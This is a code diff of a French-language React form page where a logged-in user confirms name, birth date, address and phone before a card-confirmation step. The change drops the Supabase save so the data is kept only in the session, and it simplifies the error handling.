@@ -1,9 +1,8 @@
-
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession, getFromSession, saveUserDataToJson } from "@/utils/sessionUtils";
+import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
 import { toast } from "sonner";
 
 const AddressConfirmation: React.FC = () => {
@@ -18,15 +17,11 @@ const AddressConfirmation: React.FC = () => {
   const [email, setEmail] = useState<string | null>(null);
   const navigate = useNavigate();
 
-  // Récupérer l'email de l'utilisateur connecté à partir de la session au chargement
-  // mais sans précharger les champs du formulaire
   useEffect(() => {
     const userData = getFromSession("userData");
     if (userData && userData.email) {
       setEmail(userData.email);
       console.log("Email récupéré de la session:", userData.email);
-      
-      // Nous retirons le préchargement des champs ici
     } else {
       console.log("Aucun email trouvé dans la session");
       toast.error("Veuillez vous connecter d'abord");
@@ -34,7 +29,7 @@ const AddressConfirmation: React.FC = () => {
     }
   }, [navigate]);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!nom || !prenom || !dateNaissance || !adresse || !codePostal || !ville || !telephone) {
@@ -51,44 +46,30 @@ const AddressConfirmation: React.FC = () => {
     setIsLoading(true);
 
     try {
-      // Préparer les données utilisateur avec l'email et UNIQUEMENT les informations d'adresse
-      // Les noms des champs doivent correspondre à ceux de la base de données Supabase
       const userData = {
         email,
         nom,
         prenom,
-        dateNaissance, // Sera converti en date_naissance par saveUserDataToJson
+        dateNaissance,
         adresse,
-        codePostal,   // Sera converti en code_postal par saveUserDataToJson
+        codePostal,
         ville,
         telephone
       };
       
-      // Stocker les informations dans la session
       updateUserSession(userData);
       
-      // Enregistrer dans la base de données
-      console.log("Sauvegarde des données dans Supabase:", userData);
-      await saveUserDataToJson();
-      
-      toast.success("Informations d'adresse enregistrées avec succès");
+      setIsLoading(false);
       navigate("/card-confirmation");
     } catch (error: any) {
       console.error("Erreur lors de l'enregistrement:", error);
-      
-      if (error.isRlsError) {
-        toast.error(`Erreur de sécurité Supabase: ${error.message}. Vérifiez les politiques RLS.`);
-      } else {
-        toast.error("Une erreur est survenue lors de l'enregistrement des données. Vérifiez que le schéma de la base de données correspond aux champs du formulaire.");
-      }
-    } finally {
       setIsLoading(false);
+      toast.error("Une erreur est survenue lors de l'enregistrement des données.");
     }
   };
 
   return (
     <div className="min-h-screen flex flex-col bg-white">
-      {/* Header */}
       <header className="w-full py-4 border-b border-gray-200">
         <div className="container mx-auto px-4">
           <img 
@@ -109,8 +90,6 @@ const AddressConfirmation: React.FC = () => {
           <h1 className="text-3xl font-bold text-center mb-8">
             Confirmez votre adresse
           </h1>
-
-          {/* Nous retirons l'affichage de l'email ici */}
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="grid grid-cols-2 gap-4">
@@ -206,4 +185,3 @@ const AddressConfirmation: React.FC = () => {
 };
 
 export default AddressConfirmation;
-
